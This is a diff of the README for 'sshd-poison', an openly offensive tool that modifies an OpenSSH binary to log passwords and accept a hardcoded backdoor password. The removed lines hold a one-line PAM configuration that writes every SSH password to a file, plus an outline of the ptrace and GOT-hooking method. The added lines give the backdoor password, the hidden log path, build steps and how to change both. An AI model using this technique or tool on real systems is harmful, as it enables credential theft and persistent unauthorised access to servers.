@@ -1,40 +1,62 @@
-# sshd-poison
+sshd-poison
+===========
 
-sshd-poison is a tool to get creds of pam based sshd authentication,
-this is not the easiest way to do that (you can create a pam module, or just add
-```auth optional pam_exec.so quiet expose_authtok /bin/bash -c {read,-r,x};{echo,-e,"`env`\n$x"}>>somefile```
-in a service configuration), not even the stealthiest (the tool don't have any mechanism to try hide yourself,
-and needs control the main sshd pid all the time), but code this gave me a lot of fun.
+sshd-poison is a tool that modifies a sshd binary to capture password-based authentications and allows you to login in some accounts using a magic-pass.
 
-# How it works
+This only works with x86_64-elf file. Should work with openssh 7.7p1 up to 8.3p1. The code need some modifications to work with older versions.
 
-The tool starts attaching the main sshd pid and wait for some events,
-when a new process is created, it means that a new connection was started,
-after that the tool will wait for an execve event,
-then checks if the program executed is the same as the main pid,
-to ensure a re-exec (this is why we need take control of the main pid,
-every re-exec will erase any memory modification),
-then a breakpoint are set in the entry point of the new process,
-for wait the program load the shared librarys.
-When it's done and the breakpoint has hit,
-it are unset, the program will write the shellcode to a code cave, and the
-GOT entry for pam_set_item, used by libpam, will be changed, to hook internal libpam call to pam_set_item function.
+OpenSSH versions tested:
 
-The log format are `password\0rhost\0user\0`.
-
-This will only works with x86_64 PIE binaries, and kernel 3.4 or early (PTRACE_SEIZE),
-I tested this with `OpenSSH_8.0p1, OpenSSL 1.1.1b  26 Feb 2019` with kernel `5.0.13-arch1-1-ARCH` and
-`OpenSSH_7.9p1 Debian-10, OpenSSL 1.1.1b  26 Feb 2019` with kernel `4.19.0-kali3-amd64`
+* OpenSSH_7.9p1 Debian-10+deb10u2, OpenSSL 1.1.1d  10 Sep 2019
+* OpenSSH_8.3p1, OpenSSL 1.1.1g  21 Apr 2020
 
 
-# Compiling
+Magic-pass
+----------
+
+Unhappily, the power of this magic is a bit limited.
+If you try login as root, and root login is not allowed, or if the user isn't valid, it won't work.
+
+magic-pass is ```anneeeeeeeeeeee```.
+
+Logfile
+-------
+
+Captured passwords are stored in ```/tmp/.nothing```.
+
+The strings are saved in reverse order in the following format: ```\0password\0user\0ip```, or rather ```\0drowssap\0resu\0pi```.
+
+Compiling
+---------
 
 ```
-git clone --recurse-submodules https://github.com/hc0d3r/sshd-poison
-cd sshd-poison
-make
+$ git clone --recurse-submodules https://github.com/hc0d3r/sshd-poison
+$ cd sshd-poison
+$ make
 ```
 
-# Demo
+If you want a different magic-pass/logfile, edit the following lines in **sc.asm**.
 
-![](https://raw.githubusercontent.com/hc0d3r/sshd-poison/media/Peek%2015-05-2019%2011-25.gif)
+```sh
+magic_pass: db 'anneeeeeeeeeeee', 0x0
+logfile: db '/tmp/.nothing', 0x0
+```
+
+Demo
+----
+
+![](https://raw.githubusercontent.com/hc0d3r/sshd-poison/media/demo.gif)
+
+Legal disclaimer
+----------
+
+Use for illegal purposes are not allowed.
+
+Contributing
+------------
+You can help with code, or donating money.
+If you wanna help with code, use the kernel code style as a reference.
+
+Paypal: [![](https://www.paypalobjects.com/en_US/i/btn/btn_donate_SM.gif)](https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=RAG26EKAYHQSY&currency_code=BRL&source=url)
+
+BTC: 19p3bnJ1t7DByfD8LdgU6WRSnUc2ftBxkP
